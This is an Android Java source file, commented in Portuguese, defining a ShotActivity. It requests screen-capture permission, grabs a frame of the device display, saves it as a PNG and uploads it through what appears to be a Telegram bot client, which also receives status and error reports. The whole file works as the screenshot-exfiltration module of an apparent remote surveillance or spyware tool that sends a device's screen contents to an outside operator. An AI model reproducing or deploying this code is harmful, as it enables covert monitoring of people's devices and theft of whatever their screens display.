package com.sec.app;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.nio.ByteBuffer;

public class ShotActivity extends Activity {
    private static final int REQ = 1001;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        MediaProjectionManager pm = (MediaProjectionManager)
            getSystemService(MEDIA_PROJECTION_SERVICE);
        startActivityForResult(pm.createScreenCaptureIntent(), REQ);
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        if (req != REQ || res != RESULT_OK) {
            TgApi.send("❌ screenshot: consentimento negado");
            finish();
            return;
        }
        // Android 14+: a projection precisa rodar num serviço foreground
        // com tipo mediaProjection antes de getMediaProjection()
        ShotService.resultCode = res;
        ShotService.resultData = data;
        Intent svc = new Intent(this, ShotService.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc);
        else startService(svc);

        // aguarda o serviço criar a projection (timeout 10s)
        new Thread(() -> {
            try {
                synchronized (ShotActivity.class) { ShotActivity.class.wait(10000); }
            } catch (Exception ignored) {}
            MediaProjection proj = ShotService.projection;
            if (proj == null) {
                TgApi.send("❌ screenshot: projection não criada");
                finish();
                return;
            }
            doCapture(proj);
            finish();
        }).start();
    }

    private void doCapture(MediaProjection proj) {
        try {
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            DisplayMetrics dm = new DisplayMetrics();
            wm.getDefaultDisplay().getRealMetrics(dm);
            int w = dm.widthPixels, h = dm.heightPixels, dpi = dm.densityDpi;

            ImageReader reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2);
            VirtualDisplay vd = proj.createVirtualDisplay("cap",
                w, h, dpi, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                reader.getSurface(), null, new Handler(Looper.getMainLooper()));

            // aguarda 1 frame estabilizar
            Thread.sleep(1000);
            Image img = reader.acquireLatestImage();
            if (img == null) {
                TgApi.send("❌ screenshot: frame não capturado");
                vd.release(); proj.stop();
                return;
            }

            Image.Plane plane = img.getPlanes()[0];
            ByteBuffer buf = plane.getBuffer();
            int rowPadding = plane.getRowStride() - plane.getPixelStride() * w;
            Bitmap bmp = Bitmap.createBitmap(w + rowPadding / plane.getPixelStride(),
                h, Bitmap.Config.ARGB_8888);
            bmp.copyPixelsFromBuffer(buf);
            img.close();

            // recorta o padding da direita
            Bitmap cropped = Bitmap.createBitmap(bmp, 0, 0, w, h);

            File out = new File("/sdcard/Download",
                "shot_" + System.currentTimeMillis() + ".png");
            OutputStream fo = new FileOutputStream(out);
            cropped.compress(Bitmap.CompressFormat.PNG, 100, fo);
            fo.close();

            TgApi.sendPhoto(out, "🖥 screenshot | " + out.getName());

            vd.release();
            reader.close();
            proj.stop();
            bmp.recycle(); cropped.recycle();
        } catch (Exception e) {
            TgApi.send("screenshot erro: " + e);
        }
    }
}
